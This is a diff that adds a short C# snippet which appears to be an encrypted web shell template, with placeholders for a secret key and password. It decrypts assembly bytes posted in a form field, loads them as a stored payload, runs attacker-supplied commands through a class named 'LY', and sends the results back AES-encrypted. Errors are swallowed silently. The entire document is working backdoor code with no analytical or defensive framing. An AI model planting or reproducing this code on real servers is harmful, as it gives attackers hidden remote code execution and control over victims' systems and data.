@@ -1,0 +1,35 @@
+try {
+    string key = "{secretKey}";
+    string pass = "{pass}";
+    string md5 = System.BitConverter.ToString(System.Security.Cryptography.MD5.Create().ComputeHash(System.Text.Encoding.UTF8.GetBytes(pass + key))).Replace("-", "");
+    byte[] data = System.Convert.FromBase64String(Context.Request.Form[pass]);
+    byte[] keyBytes = System.Text.Encoding.UTF8.GetBytes(key);
+    using (var aes = System.Security.Cryptography.Aes.Create()) {
+        aes.Mode = System.Security.Cryptography.CipherMode.CBC;
+        aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+        aes.Key = keyBytes;
+        aes.IV = keyBytes;
+        data = aes.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
+    }
+    if (Context.Items["gsl_payload"] == null) {
+        Context.Items["gsl_payload"] = System.Reflection.Assembly.Load(data);
+    } else {
+        System.IO.MemoryStream outStream = new System.IO.MemoryStream();
+        object o = ((System.Reflection.Assembly)Context.Items["gsl_payload"]).CreateInstance("LY");
+        o.Equals(outStream);
+        o.Equals(data);
+        o.ToString();
+        byte[] r = outStream.ToArray();
+        outStream.Dispose();
+        byte[] enc;
+        using (var aes = System.Security.Cryptography.Aes.Create()) {
+            aes.Mode = System.Security.Cryptography.CipherMode.CBC;
+            aes.Padding = System.Security.Cryptography.PaddingMode.PKCS7;
+            aes.Key = keyBytes;
+            aes.IV = keyBytes;
+            enc = aes.CreateEncryptor().TransformFinalBlock(r, 0, r.Length);
+        }
+        Context.Response.WriteAsync(md5.Substring(0, 16) + System.Convert.ToBase64String(enc) + md5.Substring(16)).GetAwaiter().GetResult();
+    }
+} catch (System.Exception) {
+}
